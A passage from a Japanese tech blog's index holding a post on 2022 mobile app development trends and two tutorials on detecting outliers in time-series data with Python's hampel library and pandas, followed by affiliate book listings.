2022年までに、モバイルアプリ市場の収益は6,930億ドルに達すると予想されています。\nただし、ほとんどのアプリは失敗してしまっているであるということです。\nこの失敗の主な理由は、最新のモバイルアプリテクノロジーのトレンドを追跡および実装できないことです。または、より技術的に適応力のある競合他社に負ける結果になります。\nモバイルアプリを成功させるための最初のステップは、2022年のモバイルアプリ開発のトレンドを常に把握することです。これらの最新のトレンドのいくつかについて詳しく説明しましょう。\nモバイルアプリ開発の新しいトレンドが数多く出現していますが、ここでは、詳細な事実に基づいた調査の結果、モバイルアプリ開発のトレンドのTOP15を取り上げました。\n5Gの台頭 5Gテクノロジーは数年前から存在していますが、近年より注目されるうようになりました。テクノロジー企業は5Gを本格的に取り入れ始めており、5G対応デバイスが市場に出回っています。来年までに、6億6000万台のスマートフォンが5G接続になると予想されており、これは全デバイスの約47.5％を占めています。 世界中の5G接続が今後数年間でどのように成長すると予測されているかを見てみましょう。\nrise of 5g 5Gの出現でアプリ開発はどうなる？ 5Gは、アプリの構築と使用の方法を変え、速度と効率が大幅に向上します。\nそれにより期待できることがいくつかあります。\n5Gは4Gよりも最大100倍高速になります。 レイテンシーは50ミリ秒（4G）から1ミリ秒に短縮されます。 高解像度、低遅延、高速性能により、ビデオストリーミングアプリケーションは大幅に改善されるだろう。 5Gでは、これらの技術をアプリに統合することが容易になるため、ARやVRの機会が増えるだろう。 デバイスとスマートフォン間でのデータ転送がより高速かつスムーズになります。 5Gを使用すると、開発者はアプリのパフォーマンスに悪影響を与えることなく新しい機能を構築できます 識別のための生体認証データの処理が高速化されているため、モバイル決済はより迅速かつ安全になります。 全体として、5Gテクノロジーはアプリをより速く、よりスムーズに、より効率的にすることができます。また、イノベーションの余地も広がります。アプリに関するワクワクするようなアイデアは、もはやアイデアにとどまることはありません。5Gを使えば、それらを実現することができます。5Gが何をもたらすのか、今から楽しみです。\n折りたたみ式デバイス用アプリ 折りたたみ式端末はスマートフォン市場全体のシェアの先端ですが、今後数年で状況が変わってきます。統計局 によると、2022年には5,000万台が出荷されるとのことです。つまりモバイルアプリの開発戦略を練る際には、折りたたみ式デバイスも念頭に置くべきでしょう。2022年のモバイルアプリ開発のトレンドである折りたたみ式デバイスで、あなたのアプリがシームレスに動作することを確認してください。\n端末を折りたたんで大きな画面を提供することは、ユーザーにいい影響を与えます。\n大きな画面は、詳細で没入感のある体験を提供するためのスペースを意味します。 マルチウィンドウにより、ユーザーは複数のタスクを同時に実行することができます。 ビデオストリーミングやゲームアプリは、画面サイズを大きくするだけで、折りたたみ式デバイスから最大限の利益を得ることができ、余分なスペースを使って追加の情報やコントロールを提供することもできます。このように、画面を意識したアプリの開発は、2022年のモバイルアプリ開発における最大のトレンドの1つとなるでしょう。\nストリーミング AR＆VR ポケモンGOの成功は一時的なものだったかもしれませんが、モバイルアプリ開発におけるARの道を切り開いたと言えるでしょう。それは、VRを使ってユーザーに没入型の体験を提供することが現実的に可能であることを世界に示したのです。\n今日、周りを見渡せば、ブランドがユーザー体験を高めるためにAR＆VRを活用しているシーンは数多く見受けられます。\nIKEAはARを使用して、ユーザーが購入する前に自宅で家具がどのように見えるかを確認できるようにします。 L\u0026rsquo;Orealは、ユーザーが自分の顔に化粧をしたときの見え方を確認できるバーチャルメイクアップアプリを提供しています。 Lenskartは、ユーザーがメガネを買う前にバーチャルで試せるようにしています。 Apple、Google、Metaでさえも、AR \u0026amp; VRにイノベーションをもたらしています。グーグルはグーグルマップに「ライブビュー」という機能を導入し、ユーザーは現実の画像上でリアルタイムに方角を確認することができるようになりました。\nLiDARもまた、最近ARの分野で見られた重要な技術的進歩です。Appleによって光の速度のARと呼ばれる - 私たちは、この技術がiPad Pro、iPhone 12 Pro、iPhone Pro 12 Pro maxでデビューするのを目にしました。それは、ARをまったく新しいレベルに引き上げました。LiDARにより、低照度下でも優れた品質の写真を撮影することが可能になりました。\nAppleはIkeaと提携し、LiDAR技術を利用した新しいスタジオモード機能を開始し、家具の買い方にまで革命を起こしています。この機能を使うと、ユーザーは家具を置きたい場所にデバイスを向けると、LiDARテクノロジーが部屋をスキャンして、実物大の家具モデルをバーチャルに配置することができます。\n今年は、ARとVRが、私たちの想像を絶する方法でモバイルアプリ開発業界を形成することが予想されます。モバイルアプリのトレンドは、より主流になるでしょう。統計局によると、ARとVR技術の世界市場は、2018年の270億ドルから2022年には約2,090億ドルに上昇すると言われています。\nまた、今年はAR＆VRのユーザー数が急増することが予想されます。このようなモバイルアプリの開発トレンドを活用して、モバイルでユーザーにゲームを変えるような体験を提供する絶好のチャンスがあるということです。\nar and vr ウェアラブルアプリの統合 ウェアラブルデバイスがすでに世界を席巻しています。\n統計局 によると、接続されたウェアラブルデバイスは2017年に4億5300万に達し、2022年までに9億2900万に達するでしょう。\n今年は、ウェアラブルデバイス業界で多くの重要なことが起こっているのを見ました。\nアップルはWatchOS 8アップデートを発表しました。これは、アップルウォッチユーザーに新機能、新鮮なウォッチフェイス、ウォレットへのアクセスの増加、インターフェイスの再設計をもたらしました。\nGoogleも、同社のウェアOSとSamsungのTizenソフトウェア・プラットフォームを融合した統一ウェアラブル・プラットフォームを発表し、アプリの起動時間を30％向上させました。\nこれは、2022年のモバイルアプリ開発の必須トレンドの1つであるウェアラブルテクノロジーの台頭を意味するものです。\nつまり、アプリ開発者や企業は、スマートウォッチやウェアラブルでユーザーに優れたデジタル体験を提供するアプリを準備し、そうでない企業に対して明確な優位性を獲得する必要があるのです。\nこのモバイルアプリ開発のトレンドを取り入れ、シームレスなデジタル体験を提供することで、ターゲットとなる顧客との距離を縮めましょう。\n食品・食料品の配達アプリ 人々はロックダウン後、在宅時間が多くなるため、食料品の即日配達サービスやミールキットなどのアプリに大きく依存するようになり、この2つは2020年から21年にかけて最も成長したアプリのカテゴリーとなりました。\nfood grocery delivery apps ご覧の通り、2020年には食料品アプリの利用者が40.9％増加しました。ほとんどの人が、食料品の買い物は実店舗に行かず、オンラインで行うことを選んだのです。\n同様のことは、フードデリバリーアプリでも起こりました。安全性が高く、オンラインで食品を注文することを好む人が多いため、32.9％の上昇となりました。\nしかし、2021年にはどちらのアプリも人気が低下しています。食料品アプリが5.8％上昇したのに対し、フードデリバリーアプリの利用者は2.6％減少しました。\n通常の生活に戻れば、その成長も少し低下するかもしれません。食品・食料品アプリは、依然として私たちの生活の重要な一部となるでしょう。人々はオンラインで食べ物を注文することをやめることはないでしょうし、食料品アプリはスマートフォンユーザーの15.5%を占めることに変わりはないでしょう。\nいずれにせよ、時間が経てばわかることですが、2022年に食品・食料品配達アプリがどのような道を歩むのか、興味深いところです。\nモバイルエンターテインメント＆ゲーム エンターテイメントやゲームアプリは、今やライフスタイルの一部となりました。それ無しでは一日たりとも過ごせないという人もいるほどです。\nNetflixの米国とカナダでのアクティブな加入者が約74％であることから、モバイルエンターテイメントアプリの人気は推し量ることができます。それだけでなく、1億5910万人以上の携帯電話ユーザーがおり、モバイルデバイスはゲーマーに人気があり、米国のデジタルゲーマーの89%以上に相当します。\nこの数字は、2022年にはさらに上昇することが予想されます。\nmobile entertainment なぜモバイルエンターテインメントとゲームアプリが人気があるのか？ エンターテインメントを手軽に楽しめるようになった。\n高価なガジェットや高価なノートパソコンを買う必要はなく、モバイルで楽しむことができる。 映画を見たり、ゲームをしたりするために、1つの場所に閉じこもる必要がない。外出先でも楽しむことができる。 AR、VR、人工知能などの技術の進歩により、ゲームやエンターテインメントアプリは、より没入感のあるもの。 モバイルエンターテインメント＆ゲームアプリは非日常を提供する。 特にパンデミック時には、人々はゲームやエンターテインメントアプリに時間を費やし、気を紛らわせました。\nAIと機械学習 FaceApp（自撮り写真を加工するアプリ）の画期的な成功の後、ほとんどの人が疑問に思っていました。次は何をするのだろう？そんな時、AIは期待をさらに大きく前進させるものをもたらしてくれました。MyHeritageAppは、写真をリアルなアニメーションに変換するすごい機能をもたらしたのです。このアニメーションはとても印象的で、愛する人があなたに微笑んでいるように感じられます。その結果、多くのリアクションが生まれました。\n昨年、AIで起こった興味深いことはこれだけではありません。Googleがマップアプリに、AIを使ってユーザー体験を向上させる新機能を投入したのも記憶に新しいです。そのひとつが、広い屋内空間でARナビゲーションを提供するライブビューです。\nGoogleはAIを利用して、燃料消費量が少なくなるように道順を最適化し、二酸化炭素排出量の少ないルートを提案することも行っています。\nAIとMLは、ここ数年連続してモバイルアプリ開発のトップトレンドの1つとなっています。しかし、これらの技術の進歩は、2022年のモバイルアプリ開発のハードルを非常に高くしており、今年はそれが何をもたらすのか興味深いところです。\n機械学習もまた、革命的なことが起こるのが待ち望まれるエキサイティングな分野です。ディープラーニングが機械学習と手を組めば、貴重なデータとリアルタイムの分析を提供し、モバイルアプリ開発プロジェクトに素晴らしい効果をもたらすことができます。\nCAGR42％で成長する世界のML産業は、2019年の機械学習から2022年後半には約90億ドル規模になる見込みです。\nAppleは、機械学習における重要なプレイヤーの1つで、その優秀なMLモデルにより、開発者は没入感のある新しい体験を生み出すことができるようになりました。既存の機能を簡単に追加できるだけでなく、新しい機能を作ることもできます。その上、ML APIで新しい機能を追加することもできます。\n今年は、これらの技術に深く入り込み、その機能をきちんと理解し、多くの構成要素に触れることをお勧めします。\nモバイルアプリのセキュリティがより重視 チェック・ポイントの「State of Mobile Security 2021」レポートによると、約46％の組織が、悪意のあるモバイル・アプリケーションをダウンロードした従業員を少なくとも1人抱えているとのことです。従業員のモバイル端末への依存度が高いことを考えると、企業にとって懸念すべき問題であると言えます。\nほとんどの企業は、サイバーセキュリティがデータ保護や情報プライバシーに関する法律に直結していることを考慮して、サイバーセキュリティへの投資を増やそうとしています。\nこのように、デジタルセキュリティは、2022年のモバイルアプリ開発のトップトレンドの1つとして浮上しています。業界の優れた頭脳は、モバイルアプリにまつわる不確実性を引き出すためにレベルアップしています。WWDC 2021で、Appleは \u0026ldquo;iCloud キーチェーン\u0026rdquo; という新機能を導入し、パスワードレスの未来への第一歩を踏み出しました。これによって、アップルはパスワードに代わって、より安全なログインプロセスを提供することになりました。\nnobile app security 2022年、モバイルアプリ開発業界は、セキュリティファーストのアプローチにシフトし、強固なDevOps戦略のロードマップを構築すると予想されます。\nスーパーアプリ 1つのアプリに1つの目的 - これが、モバイルアプリ開発会社の長年のアプローチです。しかし今、そのアプローチは変わりつつあります。企業は、単一目的のアプリから、複数の目的を解決するワンストップ・ソリューションにシフトしているのです。\nこのようなアプリはスーパーアプリと呼ばれ、アジアで絶大な人気を誇っています。しかし、このトレンドは欧米にも浸透しつつある。米国では、カリフォルニアに本社を置くブレインテクノロジーズ社が開発したNatural AIが面白い例として挙げられます。このアプリは、人々の携帯電話との付き合い方を変え、1つのアプリから複数の目的を解決できるようにすることを目指しています。\nsuper apps さらに、Facebookが単なるソーシャルメディアのプラットフォームからどのように拡張されたかをご覧になったことがあるかと思います。現在では、人々が製品を売買できるマーケットプレイスも提供されています。同様に、オンラインショッピングとは別に、請求書の支払いやAmazonからの支払いもできるようになりました。\n欧米では、スーパーアプリの流行はそれほど高くはなく、人々は1つに決める前にさまざまなソリューションを試すことを好むからです。それでも、最終的には誰もが利便性を求めるものです。スーパーアプリは、2022年に期待すべきモバイルアプリ開発のトレンドと言えるでしょう。\nモバイルコマース EEコマース分野は3兆5,600億ドル相当の売上を誇り、その72.9%はモバイルで発生しています。\nつまり、モバイルコマースはアプリ開発のトレンドとして高まっているのです。\nCOVIDの大流行後、ライフスタイルの大きな変化が見られました。大規模な小売業者から中小企業、個人消費者に至るまで、誰もがモバイルアプリに依存するようになったのです。\nそのため、適応できないEコマース企業は不利な状況に置かれています。彼らは多くの顧客を失い、彼らは変換することができるものを見逃しているもです。\nつまり、企業は、このトレンドに適応し、電子商取引のビジネスアプリを持っている必要があります。それは、彼らがカットスロート競争を生き残ることができる唯一の方法です。\nP2Pモバイルアプリ P2Pモバイルアプリは、モバイルアプリ開発分野を特徴付けるもう一つの重要なトレンドです。eMarketerによると、P2Pモバイルトランザクションの予測価値は2023年までに6,122億3,000万ドルに達するでしょう。これは、現在、P2Pモバイルアプリに大きな可能性があることを意味します。\np2p mobile apps P2Pモバイルアプリが企業やユーザーの間で人気を集めている理由は、その利便性にある。ユーザーは素早く支払いができ、売り手は自分のアカウントに直接支払いを受けることができます。そのため、余計な手間がかかりません。\n今年、私たちの周りで見られるP2Pモバイル・アプリの種類をいくつか紹介ましょう。\n決済機能を内蔵したソーシャルメディアプラットフォーム 決済のためのシステムを組み込んだモバイルOSシステム。例：Apple Pay、Samsung Pay、Android Payなど。 独自の決済システムを提供している独立系プロバイダー。 銀行を決済の当事者とするP2Pアプリ。 暗号通貨のウォレット。 P2Pモバイルアプリのアイデアがあるなら、それを実現する絶好の機会です。\nブロックチェーン 私たちがブロックチェーンについて初めて耳にしたのは、暗号通貨ブームの時でした。しかし、今ではこの技術は大きく進歩し、さまざまな分野で応用できるようになりました。かなりの勢いで成長しており、2024年までに200億ドルの収益が蓄積されると予想されています。ブロックチェーンは、モバイルアプリ開発においても極めて重要な役割を担っています。\n分散型アプリは最近の流行りです。ブロックチェーンウォレットは7000万個以上あり、そのうちモバイルウォレットは最も好まれるブロックチェーンウォレットの形態です。これらの統計は、ブロックチェーンウォレットのユーザー数が大幅に増加していることも示しています。\nblockchain そのほかに、デジタル資産の追跡、デジタルIDの保護、ロイヤルティプログラムの追跡にブロックチェーンを使用する通貨換算器も見られます。\n2022年以降には、インテリジェント・コントラクト、著作権侵害防止ソフトウェア、選挙を穏健化するツール、Blockchain as a service（BaaS）プラットフォームなど、このトレンドがより主流になると見ています。特にモバイルコマースやモバイル決済アプリでは、ブロックチェーンを利用して不正を未然に防ぐことができるのです。\n予測分析 企業は以前からモバイルアプリで予測分析を利用しています。Netflixは、ユーザーの視聴習慣に基づいて映画やテレビ番組を推薦するためにこれを使用しています。また、Amazonは、予測分析を活用して、商品の推薦をパーソナライズしています。\n今年は、予測分析がより主流になると思われます。ここでは、2022年のモバイルアプリ開発において、このトレンドが重要な役割を果たすと考えられる2つの分野を紹介します。\n開発プロセスの最適化へ\n企業は、開発者から収集したデータを処理することで、問題を事前に発見し、より良い代替案を提案することができます。 ユーザーエクスペリエンスを向上させるために\n企業はユーザーデータを利用して、ユーザーの行動を予測し、その旅をパーソナライズすることができます。 その結果、優れた品質を維持しながら開発期間を大幅に短縮し、イノベーションの実現により注力することが可能になったのです。\nモバイル学習 統計局によると、従業員の35％ がモバイルデバイスを頻繁に使って学習しているとのことです。また、モバイルラーニング市場は、2025年までに585億ドルに達し、2020年から2025年にかけて21.45%のCAGRが約束されると予想されています。つまり、モバイルラーニングは、モバイルアプリ開発のあり方を変える、有望なトレンドといえます。\nモバイルラーニングは多くの理由で有名です。まず、学習が簡単にアクセスできるようになります。学習者はどこでも、誰でも学習できるため、力を得たと感じられます。さらに、継続的なフィードバックや360度学習などの体験により、学習がインタラクティブで楽しいものになりました。\nコースの修了率の向上、学習の迅速化、エンゲージメントの向上、知識の定着率の向上につながるため、現在では企業でもモバイル学習が支持されています。\nそのため、モバイル学習アプリの需要は高いといえます。画期的なアイデアや、社員教育のためにモバイル学習ソリューションを立ち上げる計画があるのなら、今こそ教育アプリ開発を専門とするチームにコンタクトを取るべきでしょう。\nIoT対応のモバイルアプリ インターネットは私たちの生活の中に深く入り込んでいます。スマートフォン、ノートパソコン、タブレットから、音声で操作できるスマートホームデバイスまで、私たちはインターネットに接続された機器に囲まれています。モノのインターネット（IoT）は、単なるトレンドにとどまらず、2022年の市場規模は5940億ドルと推定され、私たちの日常生活の一部となりました。\nここ数年、アマゾンやグーグルのようなブランドがこの技術をフルに活用しているのを目にしました。彼らはそれぞれ「Echo」シリーズのデバイスとGoogle Home Voice Controllerを発表して、IoTの競争を強化しました。\nしかし現在では、Samsung、Xiaomi、Bosch、Honeywellなどのブランドも、モノのインターネット技術に急速に移行しています。小売業における継続的なサプライチェーン、スマートホーム、精通した健康保険プランなどは、もはやSF的なものではなく、現実に生きてきているのです。\nIoTガジェットやシステムの需要増加に伴い、IoT対応アプリの需要も同時に増加するため、2022年のモバイルアプリ開発のトップトレンドのリストに含まれています。\nまとめ GoogleとAppleのApp Storeを合わせると663万個のアプリが存在します。あなたのアプリを目立たせるには、どうしたらいいでしょうか？\n実は、モバイルアプリ開発の最新トレンドを常に把握し、それを活用して堅牢で機能豊富なアプリを提供する方法を知らなければ、できないことなのです。\nモバイルアプリ業界は今後も急速に拡大し、モバイルアプリ開発の領域も進化していくでしょう。新興のモバイルアプリプラットフォーム開発技術、上昇するバックエンドプラットフォーム、マイクロサービス、そして新しいハードウェアの性能と相まって、モバイルアプリソリューションの舵取りを続けていくでしょう。継続的に学習し、常に意識することが、熾烈な競争を勝ち抜く唯一の方法なのです。\nおすすめの書籍 NO RULES(ノー・ルールズ) 世界一「自由」な会社、NETFLIX 5万部突破!! 日経朝刊で「経営者が読むべき1冊」と激賞! (2020年12月26日付) 「日本でこんなマネのできる企業はまずないだろうが、海外の競争相手はネットフリックス流の人材厳選主義を採用しているかもしれない。その迫力と怖さを知るためにも、経営者が手に取るべき本である」 ●Netflixはどうやって190カ国で2億人を獲得できたのか？。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 オードリー・タン デジタルとAIの未来を語る オードリー・タン氏自身が、自らの考え、行動、夢を語る。 世界のメディアがいま、最も注目するテクノロジー界の叡智が、描くデジタルとAI（人工知能）の未来！ 台湾は、2020年に全世界を襲った新型コロナウイルス（COVID－19）の封じ込めに唯一成功しました。 本書は、その中心的な役割を担った若きデジタル担当政務委員（閣僚）が、コロナ対策成功の秘密、デジタルと民主主義、デジタルと教育、AIと社会・イノベーション、そして日本へのメッセージを、自身の言葉で語りつくします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-17T18:11:53+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/catch_hua1e03cb04863b34ec3302b219f888af8_22468_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/","title":"2022年に注目すべきモバイルアプリ開発トレンド 15選"},{"content":"Pandas DataFrameオブジェクト Pandasでcsvをread_csvするとDataFrameオブジェクトとして読み込まれます。\nDataFramオブジェクトは２次元配列な感じです。\n１次元目が列、２次元目が行のイメージみたいです。\n例えば以下のcsvだと\ndate,value 2019,2845 2020,3246 2021,3633 read_csvしたDataFrameオブジェクトの変数名をdfとすると\nそれぞれのデータには以下の方法でアクセスします。\ndf[\u0026#39;date\u0026#39;][0]-\u0026gt;2019 df[\u0026#39;date\u0026#39;][1]-\u0026gt;2020 df[\u0026#39;date\u0026#39;][2]-\u0026gt;2021 df[\u0026#39;value\u0026#39;][0]-\u0026gt;2845 df[\u0026#39;value][1]-\u0026gt;3246 df[\u0026#39;value\u0026#39;][2]-\u0026gt;3633 read_csvするとデフォルトだと１行目を列名とみなすみたいです。\nアクセスの方法も列名が反映され連想配列っぽくなります。\nPandas Seriesオブジェクト hampelの第１引数はPandasのSeriesオブジェクトです。\nSeriesオブジェクトは１次元の配列みたいです。\nDataFrameオブジェクトからSeriesオブジェクトに変換する方法ですが\n以下の方法でできます。\ninput=pd.Series(df[\u0026#39;value\u0026#39;]) csvを読み込んでhampelメソッドを使い異常値を検出する 。 プログラムは以下の流れになります。\ncsvをread_csvでDataFrameオブジェクトとして読み込む。\nDataFrameオブジェクトからSeriesオブジェクトを生成する。\nSeriesオブジェクトを使ってhampelメソッドを呼び出して異常値を検出する。\nソースコードは以下の通り\nimport matplotlib.pyplot as plt import pandas as pd from hampel import hampel # データ取得 df = pd.read_csv(\u0026#39;./kome.csv\u0026#39;) print(df.columns) print(df[\u0026#39;value\u0026#39;]) input = pd.Series(df[\u0026#39;value\u0026#39;]) rsts = hampel(input, window_size=5, n=3) for rst in rsts: print(\u0026#39;%d:date:%s value:%d\u0026#39; % (rst,df[\u0026#39;date\u0026#39;][rst],df[\u0026#39;value\u0026#39;][rst])) 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-17T17:46:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/","title":"s-Stat 時系列データで異常値を検知しよう（３）"},{"content":"hampel フィルタとは 時系列データの異常値検知で良いのないかなあと探しました。\n最近は機械学習で時系列データの異常値検知をやっているものが結構ある感じでしたが、\ne-Statの統計データですが年次や月次だったりするのでデータ数がそんなに多くないので機械学習はどうだろうと思い今回は機械学習以外の方法を探しました。\n標準偏差などを利用して異常値を検出するアルゴリズムとしてHampelフィルターというものがありました。\npythonでhampelというライブラリーで簡単に利用できそうなのでまずこれを試してみます。\npython hampel ライブラリを利用 hampelはpip で簡単にインストールできます\npip install hampel import matplotlib.pyplot as plt import pandas as pd from hampel import hampel input=pd.Series([3, 2, 1 , 3 , 1, 2, 9, 2, 1, 22, 1, 1, 8]) rst = hampel(input, window_size=5, n=3) print(\u0026#34;rst: \u0026#34;, rst) bash-3.2$ python p.py rst: [6, 9, 12] 時系列データをpandasのSeriesに１次元で食わせて\nhampelメソッドを呼び出すだけで簡単に異常値が検出できます。\n異常値が検出された配列の番号が返却されます。\nこの例だと7個目の9,10個目の22,13個目の8です。\nwindon_size などは経験的にパラメータ調整するみたいです。\n次回は前回読み込んだcsvを使って異常値を検出するところまで行きたいと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 